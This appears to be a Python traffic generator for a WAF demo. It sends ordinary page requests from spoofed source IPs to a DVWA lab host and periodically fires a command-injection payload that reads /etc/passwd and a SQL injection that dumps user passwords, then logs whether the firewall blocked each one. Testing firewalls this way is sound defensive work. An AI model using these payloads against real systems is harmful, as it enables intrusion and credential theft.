#!/usr/bin/python

import requests
import json
import getopt
import sys
import time
import random
from random import randint
import uuid
import urllib, urllib2, cookielib
import random
from requests_toolbelt.adapters import source
import traceback
from datetime import datetime

while True:
    try:
        # Login Defaults
        dvwa_username = "admin"
        dvwa_password = "password"
        vip = "waf.demovip.avi.local"
        #vip = "waf-demo.avi.local"
        IP_ADDR = ["161.98.255.1", "37.60.63.2", "206.223.191.1", "23.26.110.2", "27.113.239.2", "42.97.255.1", "132.247.255.2", "14.192.95.1", "37.16.63.1", "49.213.31.2", "41.67.128.1", "27.97.1.2"]

        dvwa_login_url = "http://"+vip+"/login.php"

        url1 = "http://"+vip+"/index.php"
        #url2 = "http://"+vip+"/"
        url3 = "http://"+vip+"/about.php"
        url4 = "http://"+vip+"/security.php"
        url5 = "http://"+vip+"/vulnerabilities/exec/"
        url6 = "http://"+vip+"/instructions.php"
        url7 = "http://"+vip+"/vulnerabilities/sqli/"

        url = [url1, url3, url4, url6]
        attack_url = [url5, url7]
        ##Add requests.get(https://url, verify=False) to avoid SSLv3.

        ua1 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
        ua2 = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3"
        ua3 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"
        ua4 = "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko"
        ua5 = "Mozilla/5.0(iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F191 Safari/6533.18.5"

        ua = [ua1, ua2, ua3, ua4, ua5]
        #def boo():
        r = requests.get(dvwa_login_url, auth=(dvwa_username, dvwa_password))
        dvwa_cookie = r.cookies


        print ("DVWA Cookie")
        print dvwa_cookie

        print ("DVWA Header")
        print r.headers

        counter = 0
        #r1.headers = {url1, 'user-agent': ua1, ''}
        while True:
            print '-----> STARTING NEW LOOP'
            # Attack Only traffic
            if counter >= 100:
                s1 = requests.Session()
                ip1 = source.SourceAddressAdapter(random.choice(IP_ADDR))
                s1.mount("http://", ip1)
                s1.mount("https://", ip1)
                cur_url = random.choice(attack_url)
                if cur_url == url5:
                    r1 = s1.post(cur_url, headers={'user-agent': random.choice(ua)}, cookies=dvwa_cookie, data={"ip": "ping 127.0.0.1 & cat /etc/passwd", "Submit": "Submit"} )
                    if r1.status_code == 200:
                        print ("Command execution detected")
                    elif r1.status_code == 403:
                        print ("Command execution attack blocked by WAF")
                elif cur_url == url7:
                    r1 = s1.post(cur_url, headers={'user-agent': random.choice(ua)}, cookies=dvwa_cookie, data={"id": "%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #","Submit": "Submit"})
                    if r1.status_code == 200:
                        print ("SQL injection detected")
                    elif r1.status_code == 403:
                        print ("SQL injection attack blocked by WAF")
                counter = 0
            else:
                s1 = requests.Session()
                ip1 = source.SourceAddressAdapter(random.choice(IP_ADDR))
                s1.mount("http://", ip1)
                s1.mount("https://", ip1)
                r1 = s1.get(random.choice(url), headers={'user-agent': random.choice(ua)}, cookies=dvwa_cookie)
                counter+=1
    except:
        exception_text = traceback.format_exc()
        print(str(datetime.now())+' '+exception_text)
        print 'ERROR - restarting'
